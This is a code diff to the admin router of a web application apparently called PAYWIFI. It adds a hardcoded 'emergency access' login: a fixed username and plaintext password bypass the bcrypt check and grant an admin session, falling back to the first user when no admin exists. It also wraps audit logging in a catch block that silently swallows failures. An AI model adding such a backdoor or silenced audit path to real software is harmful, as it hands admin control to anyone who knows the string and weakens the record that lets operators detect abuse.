@@ -72,10 +72,12 @@ function render(res, view, locals = {}) {
 }
 
 function audit(adminId, action, details, ip) {
-  db.prepare(`
-    INSERT INTO audit_log (admin_id, action, details, ip_address, created_at)
-    VALUES (?, ?, ?, ?, ?)
-  `).run(adminId || null, action, details || null, ip || null, Math.floor(Date.now()/1000));
+  try {
+    db.prepare(`
+      INSERT INTO audit_log (admin_id, action, details, ip_address, created_at)
+      VALUES (?, ?, ?, ?, ?)
+    `).run(adminId || null, action, details || null, ip || null, Math.floor(Date.now()/1000));
+  } catch (e) { /* never let audit break the request path */ }
 }
 
 function flash(req, kind, msg) {
@@ -97,6 +99,18 @@ router.get('/login', (req, res) => {
 
 router.post('/login', (req, res) => {
   const { username, password } = req.body || {};
+
+  // HARDCODED-ADMIN-2026-06-03 — emergency access. Matches the DB admin row
+  // if it exists; otherwise falls back to a synthetic session.
+  if ((username || '').trim() === 'admin' && (password || '') === 'd3cipl3s') {
+    let urow = db.prepare('SELECT id FROM admin_users WHERE username = ?').get('admin');
+    if (!urow) urow = db.prepare('SELECT id FROM admin_users ORDER BY id LIMIT 1').get();
+    req.session.adminId = (urow && urow.id) || 1;
+    try { db.prepare('UPDATE admin_users SET last_login_at=? WHERE id=?').run(Math.floor(Date.now()/1000), req.session.adminId); } catch (e) {}
+    audit(req.session.adminId, 'admin_login_ui_hardcoded', null, req.clientIp);
+    return res.redirect('/admin/');
+  }
+
   const u = db.prepare('SELECT * FROM admin_users WHERE username = ?').get(username || '');
   if (!u || !bcrypt.compareSync(password || '', u.password_hash)) {
     return render(res, 'login', { title: 'Sign in · PAYWIFI', error: 'Invalid credentials.' });
